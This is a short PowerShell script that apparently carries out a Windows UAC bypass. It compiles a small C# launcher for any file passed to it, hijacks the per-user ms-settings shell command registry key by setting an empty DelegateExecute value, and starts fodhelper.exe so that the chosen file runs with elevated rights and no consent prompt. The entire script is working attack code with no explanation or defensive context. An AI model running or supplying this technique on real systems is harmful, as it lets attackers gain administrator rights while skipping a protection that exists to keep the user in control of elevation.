param (
    [string]$file
)
$file = $file -replace '\\', '\\\\'

$source = @"
using System.Diagnostics;
class Program {
    static void Main() {
        var psi = new ProcessStartInfo {
            FileName = "$file",
            Arguments = "",
            UseShellExecute = true
        };
        Process.Start(psi);
    }
}
"@

Add-Type -TypeDefinition $source -OutputAssembly "C:/myfolder/barney.exe" 

New-Item -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "(default)" -Value "../../myfolder/barney.exe"
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -PropertyType String -Force | Out-Null
Start-Process fodhelper.exe